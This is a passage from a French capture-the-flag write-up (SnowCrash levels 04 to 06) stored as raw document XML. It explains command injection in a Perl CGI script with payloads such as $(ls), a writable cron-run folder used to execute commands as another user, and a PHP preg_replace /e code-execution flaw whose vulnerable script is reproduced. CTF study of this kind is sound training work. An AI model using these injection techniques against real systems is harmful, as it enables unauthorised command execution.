      <text:p text:style-name="P4"><text:span text:style-name="T11">param("x")</text:span> vaut ici <text:span text:style-name="T11">hello</text:span>.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Notre script PERL prend donc le paramètre d'URL nommé <text:span text:style-name="T5">x</text:span>, puis le passe à sa fonction (du même nom). Il se contente de stocker l'argument de fonction dans une variable <text:span text:style-name="T11">$y</text:span> (<text:span text:style-name="T11">$_[0]</text:span> est l'argument par défaut perl), puis d'afficher le résultat de la commande <text:span text:style-name="T11">echo $y 2&gt;&amp;1</text:span>.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Car en effet, les backticks permettent, en PERL, d'exécuter des commandes system (ici <text:span text:style-name="T5">echo</text:span>). Typiquement, le fonctionnement normal du script est :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr1" draw:name="images12" text:anchor-type="paragraph" svg:width="12.675cm" svg:height="3.388cm" draw:z-index="11"><draw:image xlink:href="Pictures/200000070000318300000D3C1EBA9483.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P4">On affiche simplement le paramètre d'URL transmis. Cependant, on se situe dans une exécution de commande. Que se passerait-il si notre payload était "-n hey" ? Le flag <text:span text:style-name="T5">-n </text:span>est correctement interprété par la commande <text:span text:style-name="T5">echo</text:span> (et on affiche pas la newline) :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr1" draw:name="images13" text:anchor-type="paragraph" svg:width="11.386cm" svg:height="2.882cm" draw:z-index="12"><draw:image xlink:href="Pictures/200000070000316800000C82CF76E16F.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P4">Il s'agit à ce stade d'une manipulation assez inoffensive. Que se passerait-il cependant si je lui passais le payload $(ls) ? Le script PERL demanderait alors au système d'exécuter la commande suivante :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P7">echo $(ls) 2&gt;&amp;1</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Ce qui affiche bien sûr le résultat de notre commande <text:span text:style-name="T5">ls</text:span>. Une alternative serait d'utiliser les <text:soft-page-break/>backticks :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P8"><text:span text:style-name="T8">echo </text:span>´ls´ 2&gt;&amp;1</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10">(Théoriquement on pourrait même insérer des '<text:span text:style-name="T11">;</text:span>' ou '<text:span text:style-name="T11">&amp;&amp;</text:span>' afin d'exécuter une commande distincte, mais je n'arrive pas à le faire fonctionner).</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10">Quoi qu'il en soit, on a tout ce qu'il faut pour récupérer notre flag désormais :</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"><draw:frame draw:style-name="fr2" draw:name="images14" text:anchor-type="paragraph" svg:width="13.548cm" svg:height="2.91cm" draw:z-index="13"><draw:image xlink:href="Pictures/20000007000034EC00000B5F84DFB538.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">NOTE : On peut également, comme relevé dans le tutoriel PERL CGI ci-dessus, faire tourner des scripts PERL CGI depuis la ligne de commande. Typiquement, on peut faire fonctionner le script de manière normale comme ceci :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr2" draw:name="images15" text:anchor-type="paragraph" svg:width="10.001cm" svg:height="1.907cm" draw:z-index="14"><draw:image xlink:href="Pictures/2000000700002712000007725C6F316E.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Par contre, en essayant de faire fonctionner notre exploit depuis la ligne de commande, cela ne semble pas fonctionner, le script s'exécute en tant que notre utilisateur actuel seulement :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr2" draw:name="images16" text:anchor-type="paragraph" svg:width="16.194cm" svg:height="2.515cm" draw:z-index="15"><draw:image xlink:href="Pictures/2000000700003F42000009D3B55C830A.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P4">Pourquoi le script n'est-il exécuté qu'en tant que level04 alors qu'il est SUID flag04 (voir première capture d'écran pour ce flag) ? La réponse se trouve ici :</text:p>
      <text:p text:style-name="P4"><text:a xlink:type="simple" xlink:href="https://stackoverflow.com/questions/21597300/can-i-setuid-for-perl-script" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://stackoverflow.com/questions/21597300/can-i-setuid-for-perl-script</text:a></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">"<text:span text:style-name="T1">Many unix systems (probably most modern ones) ignore the suid bit on interpreter scripts, as it opens up too many security holes.The script's interpreter would be the thing that would actually need to be</text:span> <text:span text:style-name="Source_20_Text">setuid</text:span>, <text:span text:style-name="T1">but doing that is a really bad idea</text:span>". </text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P3">Ainsi, le fait que le script soit SUID n'était pas important ici : l'important était que le serveur exécute le CGI en tant que flag04 avec SuexecUserGroup (voir la configuration du serveur).</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Quoi qu'il en soit, on récupère le flag04 et on se connecte en tant que <text:span text:style-name="T5">level05</text:span>.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P13">✔️[OK]<text:tab/>Ressources</text:p>
      <text:p text:style-name="P13">[OK]<text:tab/>Flag</text:p>
      <text:p text:style-name="P3"/>
      <text:list xml:id="list3212118051198351854" text:style-name="L7">
        <text:list-item>
          <text:p text:style-name="P53"><text:soft-page-break/>Level 05</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P4">Rien dans le dossier <text:span text:style-name="T5">home </text:span>de cet utilisateur. On cherche rapidement depuis la racine tous les fichiers appartenant à level05 ; puis à flag05 :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P7">find . -user level05</text:p>
      <text:p text:style-name="P7">find . -user flag05</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">On ne trouve rien pour level05 ; on trouve un binaire pour flag05 :</text:p>
      <text:p text:style-name="P7">/usr/sbin/openarenaserver</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Un <text:span text:style-name="T11">ls -la</text:span> nous informe qu'on ne peut cependant ni lire ce fichier, ni l'exécuter ou quoi que ce soit.</text:p>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr5" draw:name="images17" text:anchor-type="paragraph" svg:x="0.231cm" svg:y="0cm" svg:width="16.536cm" svg:height="1.005cm" draw:z-index="16"><draw:image xlink:href="Pictures/2000000700004099000003EEA8B09DEC.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P4">En l'état, il nous faut plus d'informations car on ne peut pas faire grand chose. En cherchant tous les fichiers ayant <text:span text:style-name="T5">level05 </text:span>dans leur nom, on trouve :</text:p>
      <text:p text:style-name="P7">/var/mail/level05</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Ce fichier a le contenu suivant :</text:p>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr5" draw:name="images18" text:anchor-type="paragraph" svg:x="1.672cm" svg:y="0.397cm" svg:width="13.654cm" svg:height="0.981cm" draw:z-index="17"><draw:image xlink:href="Pictures/2000000700003556000003D464E437FD.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P4">Cela correspond à une entrée d'un cronjob, qui fait tourner le binaire <text:span text:style-name="T11">/usr/sbin/openarenaserver</text:span> en tant que l'utilisateur flag05 toutes les 30 secondes (pour le format crontab, <text:a xlink:type="simple" xlink:href="https://www.pantz.org/software/cron/croninfo.html" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">voir ici</text:a>).</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">On ne peut malheureusement toujours pas exécuter de fichiers binaires en l'état (pour éviter qu'on parte sur dirtycow directement dès le level00), donc on ne peut pas exécuter <text:span text:style-name="T5">pspy64</text:span> pour vérifier l'exécution régulière de ce binaire, et de constater éventuellement les appels système qu'il effectue [FAUX, on aurait pu exécuter pspy ici, mais en 32 bits].</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Encore une fois, on ne peut pas faire grand chose à ce stade, il nous faut plus d'informations. On a remarqué le petit '<text:span text:style-name="T11">+</text:span>' à côté des permissions du binaire <text:span text:style-name="T5">openarenaserver</text:span> ; cela signifie que des ACL supplémentaires ont été définis pour l'accès à ce fichier (permet une gestion plus fine du contrôle d'accès, par utilisateur par exemple ; <text:a xlink:type="simple" xlink:href="https://www.golinuxhub.com/2013/12/what-is-plus-sign-in-permission-in-linux/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">voir ici</text:a>).</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Pour afficher ces permissions supplémentaires, on utilise la commande <text:span text:style-name="T11">getfacl</text:span> :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr3" draw:name="images19" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="4.752cm" draw:z-index="18"><draw:image xlink:href="Pictures/2000000700004526000013552DDDB221.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3">On voit qu'une permission spéciale a été attribuée à notre utilisateur actuel, <text:span text:style-name="T5">level05</text:span>, qui peut lire le <text:soft-page-break/>fichier. C'est une bonne nouvelle dans le sens où on va donc pouvoir transférer le binaire sur notre machine Kali pour l'analyser ; ce qu'on fait avec <text:span text:style-name="T5">nc</text:span>.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Finalement, on se rend compte qu'il n'y a pas grand chose à analyser. Openarenaserver n'était pas un fichier binaire de type ELF, mais un POSIX shell script, avec le contenu suivant :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr1" draw:name="images20" text:anchor-type="paragraph" svg:width="14.34cm" svg:height="4.262cm" draw:z-index="19"><draw:image xlink:href="Pictures/2000000700003805000010A554295403.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3">Il s'agit vraiment d'un script extrêmement simple. On peut ignorer l'appel à ulimit, qui permet simplement de restreindre l'utilisation des ressources du système. Cette commande exécute tout bonnement l'intégralité des fichiers dans le dossier /opt/openarenaserver, avant de les supprimer.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Or, on dispose bien des droits en <text:span text:style-name="T5">write </text:span>dans le dossier /opt/openarenaserver. De là, l'exploit est ridiculement simple :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr1" draw:name="images21" text:anchor-type="paragraph" svg:width="20.498cm" svg:height="5.719cm" draw:z-index="20"><draw:image xlink:href="Pictures/2000000700005E7800001A5C1C0EA467.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3">On crée notre script "<text:span text:style-name="T11">hehe.sh</text:span>" qui exécute la commande <text:span text:style-name="T11">getflag</text:span> et place le résultat dans tmp ; on attend 30 secondes que le cronjob passe, ce dernier exécute notre fichier, et on récupère le flag.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">On s'en sert pour se log au <text:span text:style-name="T5">level06</text:span>.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P13">✔️[OK]<text:tab/>Ressources</text:p>
      <text:p text:style-name="P14">[OK]<text:tab/>Flag</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:list xml:id="list4796143114054174697" text:style-name="L8">
        <text:list-item>
          <text:p text:style-name="P54">Level 06</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">On tombe sur deux fichiers dans le dossier <text:span text:style-name="T5">home </text:span>de cet utilisateur : un binaire ELF level06, ainsi qu'un script PHP level06.php :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr1" draw:name="images22" text:anchor-type="paragraph" svg:width="13.663cm" svg:height="4.073cm" draw:z-index="21"><draw:image xlink:href="Pictures/20000007000038D9000010F44CE355D3.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/></text:p>
      <text:p text:style-name="P3">Le binaire est SUID en tant que l'utilisateur <text:span text:style-name="T5">flag06</text:span>. Il s'agit d'un simple wrapper écrit en C, qui a pour but de lancer le script <text:span text:style-name="T5">level06.php </text:span>avec les droits de l'utilisateur flag06 (comme on l'a remarqué ci-dessus, les scripts PERL, PHP... ne peuvent la plupart du temps pas être SUID eux-mêmes, il faudrait que l'interprêteur le soit, d'où l'écriture de wrappers pour simuler un SUID).</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">On le confirme en décompilant le binaire <text:span text:style-name="T5">level06</text:span>, qui a pour mission d'effectuer un appel system à <text:span text:style-name="T11">execve</text:span> avec "<text:span text:style-name="T11">/usr/bin/php /home/user/level06/level06.php</text:span>", et son effective UID (qui est celui de <text:span text:style-name="T5">flag06</text:span>).</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr1" draw:name="images23" text:anchor-type="paragraph" svg:width="8.521cm" svg:height="3.971cm" draw:z-index="22"><draw:image xlink:href="Pictures/200000070000214900000F82B0118161.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3">La faille se trouvera donc dans le fichier PHP, et non le binaire qui n'est qu'un wrapper. On examine ce fichier PHP :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P35">#!/usr/bin/php</text:p>
      <text:p text:style-name="P37">&lt;?php</text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T19">function</text:span> <text:span text:style-name="T25">y</text:span><text:span text:style-name="T20">(</text:span><text:span text:style-name="T26">$m</text:span><text:span text:style-name="T20">)</text:span> <text:span text:style-name="T20">{</text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T20"><text:tab/></text:span><text:span text:style-name="T26">$m</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T28">preg_replace</text:span><text:span text:style-name="T20">(</text:span><text:span text:style-name="T23">"/\./"</text:span><text:span text:style-name="T20">,</text:span> <text:span text:style-name="T23">" x "</text:span><text:span text:style-name="T20">,</text:span> <text:span text:style-name="T26">$m</text:span><text:span text:style-name="T20">);</text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T20"><text:tab/></text:span><text:span text:style-name="T26">$m</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T28">preg_replace</text:span><text:span text:style-name="T20">(</text:span><text:span text:style-name="T23">"/@/"</text:span><text:span text:style-name="T20">,</text:span> <text:span text:style-name="T23">" y"</text:span><text:span text:style-name="T20">,</text:span> <text:span text:style-name="T26">$m</text:span><text:span text:style-name="T20">);</text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T21"><text:tab/></text:span><text:span text:style-name="T19">return</text:span> <text:span text:style-name="T26">$m</text:span><text:span text:style-name="T20">;</text:span></text:p>
      <text:p text:style-name="P34">}</text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P33"><text:span text:style-name="T19">function</text:span> <text:span text:style-name="T25">x</text:span><text:span text:style-name="T20">(</text:span><text:span text:style-name="T26">$y</text:span><text:span text:style-name="T20">,</text:span> <text:span text:style-name="T26">$z</text:span><text:span text:style-name="T20">)</text:span> <text:span text:style-name="T20">{</text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T20"><text:tab/></text:span><text:span text:style-name="T26">$a</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T28">file_get_contents</text:span><text:span text:style-name="T20">(</text:span><text:span text:style-name="T26">$y</text:span><text:span text:style-name="T20">);</text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T20"><text:tab/></text:span><text:span text:style-name="T26">$a</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T28">preg_replace</text:span><text:span text:style-name="T20">(</text:span><text:span text:style-name="T23">"/(\[x (.*)\])/e"</text:span><text:span text:style-name="T20">,</text:span> <text:span text:style-name="T23">"y(\"\\2\")"</text:span><text:span text:style-name="T20">,</text:span> <text:span text:style-name="T26">$a</text:span><text:span text:style-name="T20">);</text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T20"><text:tab/></text:span><text:span text:style-name="T26">$a</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T28">preg_replace</text:span><text:span text:style-name="T20">(</text:span><text:span text:style-name="T23">"/\[/"</text:span><text:span text:style-name="T20">,</text:span> <text:span text:style-name="T23">"("</text:span><text:span text:style-name="T20">,</text:span> <text:span text:style-name="T26">$a</text:span><text:span text:style-name="T20">);</text:span> <text:span text:style-name="T26">$a</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T28">preg_replace</text:span><text:span text:style-name="T20">(</text:span><text:span text:style-name="T23">"/\]/"</text:span><text:span text:style-name="T20">,</text:span> <text:span text:style-name="T23">")"</text:span><text:span text:style-name="T20">,</text:span> <text:span text:style-name="T26">$a</text:span><text:span text:style-name="T20">);</text:span> </text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T19"><text:tab/>return</text:span> <text:span text:style-name="T26">$a</text:span><text:span text:style-name="T20">;</text:span></text:p>
      <text:p text:style-name="P34">}</text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T26">$r</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T20">x(</text:span><text:span text:style-name="T26">$argv</text:span><text:span text:style-name="T20">[</text:span><text:span text:style-name="T27">1</text:span><text:span text:style-name="T20">],</text:span> <text:span text:style-name="T26">$argv</text:span><text:span text:style-name="T20">[</text:span><text:span text:style-name="T27">2</text:span><text:span text:style-name="T20">]);</text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T19">print</text:span> <text:span text:style-name="T26">$r</text:span><text:span text:style-name="T20">;</text:span></text:p>
      <text:p text:style-name="P27">?&gt;</text:p>
      <text:p text:style-name="P3">On a donc un script qui prend deux arguments en ligne de commande. On appelle ensuite la fonction x, qui commence par récupérer le contenu du fichier pointé par le premier argument de ligne de commande par un <text:span text:style-name="T11">file_get_contents</text:span>. On a ensuite pas mal de preg_replace qui sont <text:soft-page-break/>appelés sur le résultat, qui est enfin affiché.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">On a donc premièrement une LFI en tant que <text:span text:style-name="T5">flag06</text:span>. Peu utile, mais elle est là. Ma première intuition était d'utiliser <text:span text:style-name="T11">$argv[1]</text:span>, qui est utilisé dans <text:span text:style-name="T11">file_get_contents($y)</text:span> : en effet, si la variable PHP est remplacée par notre input, peut-être qu'entrer <text:span text:style-name="T11">´ìd´ </text:span><text:span text:style-name="T29">en argument de la ligne de commande aurait fait exécuter nos commandes au script PHP.</text:span></text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P3"><text:span text:style-name="T29">Cela ne fonctionne cependant pas, file_get_contents interprète notre argument </text:span><text:span text:style-name="T11">´ìd´</text:span><text:span text:style-name="T29"> de manière littérale, sans exécuter la commande. Après avoir testé en local avec un simple file_get_contents prenant argv[1] sans aucune autre modification, le comportement est le même et la variable est interprétée de manière littérale.</text:span></text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P3"><text:span text:style-name="T29">Il faut donc trouver un autre moyen d'exploiter ce script. On s'aperçoit assez vite que ce dernier utilise </text:span><text:span text:style-name="T30">preg_replace avec l'option /e</text:span><text:span text:style-name="T29">, qui constitue une faille de sécurité très importante (on l'a déjà croisé dans Fortress Jet, HackTheBox_Shocker3.odt) :</text:span></text:p>
      <text:p text:style-name="P3"><text:a xlink:type="simple" xlink:href="https://stackoverflow.com/questions/16986331/can-someone-explain-the-e-regex-modifier" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T29">https://stackoverflow.com/questions/16986331/can-someone-explain-the-e-regex-modifier</text:span></text:a><text:span text:style-name="T29"> </text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P3"><text:span text:style-name="T29">Petit tutoriel sur </text:span><text:span text:style-name="T30">preg_replace</text:span><text:span text:style-name="T29"> :</text:span></text:p>
      <text:p text:style-name="P3"><text:a xlink:type="simple" xlink:href="https://www.phptutorial.net/php-tutorial/php-preg_replace/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T29">https://www.phptutorial.net/php-tutorial/php-preg_replace/</text:span></text:a><text:span text:style-name="T29"> </text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P9">string preg_replace($pattern, $replacement, $subject)</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">La fonction preg_replace cherche un <text:span text:style-name="T5">pattern </text:span>dans la string <text:span text:style-name="T5">subject</text:span>. S'il trouve ce pattern, ce dernier est remplacé dans la string source par <text:span text:style-name="T5">replacement</text:span>.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Un petit exemple tout simple :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr1" draw:name="images24" text:anchor-type="paragraph" svg:width="11.194cm" svg:height="4.339cm" draw:z-index="23"><draw:image xlink:href="Pictures/2000000700002BB9000010F48F58FCD0.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3">La variable <text:span text:style-name="T5">$pattern</text:span> est une expression régulière PHP, qui se situe donc entre slash <text:span text:style-name="T11">/REGEXP/</text:span>. Ici, on cherche simplement la chaîne "Quentin" dans $a ; si on la trouve, on la remplace par "Tristan".</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Le résultat de ce script est donc simplement :</text:p>
      <text:p text:style-name="P9">&gt; Bonjour Tristan</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Comme on vient de le voir, la variable $<text:span text:style-name="T5">pattern </text:span>est une expression régulière PHP, on peut donc faire des choses bien plus complexes en termes de patterns. Un autre exemple qui reste relativement simple :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr1" draw:name="images25" text:anchor-type="paragraph" svg:width="10.7cm" svg:height="3.99cm" draw:z-index="24"><draw:image xlink:href="Pictures/2000000700002F2200001193FAE12CB2.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">&gt; La REGEXP est ici <text:span text:style-name="T10">/\|(.*)\|/</text:span> <text:s text:c="2"/>: cette expression match, dès lors qu'on a :</text:p>
      <text:list xml:id="list7934913586312091967" text:style-name="L9">
        <text:list-item>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P63">N'importe quel nombre (<text:span text:style-name="T11">*</text:span>) de n'importe quel caractère (<text:span text:style-name="T11">.</text:span>), entourés de <text:span text:style-name="T5">pipes </text:span>(qu'on a escape avec des backslash).</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P63">Les parenthèses permettent de "capturer" une certaine partie du match de la regexp pour pouvoir y faire référence ensuite dans <text:span text:style-name="T5">$replacement</text:span> (voir l'exemple suivant).</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Le résultat de cette commande est :</text:p>
      <text:p text:style-name="P9">&gt; This is a string for preg_replace hehe</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Le dernier exemple est la regexp utilisée par snowcrash :</text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr2" draw:name="images26" text:anchor-type="paragraph" svg:width="11.352cm" svg:height="4.367cm" draw:z-index="25"><draw:image xlink:href="Pictures/2000000700002C580000110F5E711277.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3">Ici, la regexp est similaire à celle construite ci-dessus. On match :</text:p>
      <text:list xml:id="list516423897939981850" text:style-name="L10">
        <text:list-item>
          <text:p text:style-name="P64">N'importe quel nombre (*) de n'importe quel caractère (.) entre brackets et suite à un x suivi d'un espace : [x (*.)]</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P64">On remplace cette regexp par le second élément "capturé" par la regexp, c'est-à-dire ce qui est contenu dans la seconde paire de parenthèses de la regexp, en utilisant la syntaxe <text:span text:style-name="T5">\2</text:span>.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">En d'autres termes, cette commande ici remplace "[x hallo]" par "hallo", puisque "hallo" correspond à (*.).</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Le résultat du script est :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P9">&gt; hallo bruh</text:p>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">On a désormais les outils pour comprendre les preg_replace du script qui nous intéresse.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P35">#!/usr/bin/php</text:p>
      <text:p text:style-name="P37">&lt;?php</text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T19">function</text:span> <text:span text:style-name="T25">y</text:span><text:span text:style-name="T20">(</text:span><text:span text:style-name="T26">$m</text:span><text:span text:style-name="T20">)</text:span> <text:span text:style-name="T20">{</text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T20"><text:tab/></text:span><text:span text:style-name="T26">$m</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T28">preg_replace</text:span><text:span text:style-name="T20">(</text:span><text:span text:style-name="T23">"/\./"</text:span><text:span text:style-name="T20">,</text:span> <text:span text:style-name="T23">" x "</text:span><text:span text:style-name="T20">,</text:span> <text:span text:style-name="T26">$m</text:span><text:span text:style-name="T20">);</text:span></text:p>
      <text:p text:style-name="P33"><text:soft-page-break/><text:span text:style-name="T20"><text:tab/></text:span><text:span text:style-name="T26">$m</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T28">preg_replace</text:span><text:span text:style-name="T20">(</text:span><text:span text:style-name="T23">"/@/"</text:span><text:span text:style-name="T20">,</text:span> <text:span text:style-name="T23">" y"</text:span><text:span text:style-name="T20">,</text:span> <text:span text:style-name="T26">$m</text:span><text:span text:style-name="T20">);</text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T21"><text:tab/></text:span><text:span text:style-name="T19">return</text:span> <text:span text:style-name="T26">$m</text:span><text:span text:style-name="T20">;</text:span></text:p>
      <text:p text:style-name="P34">}</text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P33"><text:span text:style-name="T19">function</text:span> <text:span text:style-name="T25">x</text:span><text:span text:style-name="T20">(</text:span><text:span text:style-name="T26">$y</text:span><text:span text:style-name="T20">,</text:span> <text:span text:style-name="T26">$z</text:span><text:span text:style-name="T20">)</text:span> <text:span text:style-name="T20">{</text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T20"><text:tab/></text:span><text:span text:style-name="T26">$a</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T28">file_get_contents</text:span><text:span text:style-name="T20">(</text:span><text:span text:style-name="T26">$y</text:span><text:span text:style-name="T20">);</text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T20"><text:tab/></text:span><text:span text:style-name="T26">$a</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T28">preg_replace</text:span><text:span text:style-name="T20">(</text:span><text:span text:style-name="T23">"/(\[x (.*)\])/e"</text:span><text:span text:style-name="T20">,</text:span> <text:span text:style-name="T23">"y(\"\\2\")"</text:span><text:span text:style-name="T20">,</text:span> <text:span text:style-name="T26">$a</text:span><text:span text:style-name="T20">);</text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T20"><text:tab/></text:span><text:span text:style-name="T26">$a</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T28">preg_replace</text:span><text:span text:style-name="T20">(</text:span><text:span text:style-name="T23">"/\[/"</text:span><text:span text:style-name="T20">,</text:span> <text:span text:style-name="T23">"("</text:span><text:span text:style-name="T20">,</text:span> <text:span text:style-name="T26">$a</text:span><text:span text:style-name="T20">);</text:span></text:p>
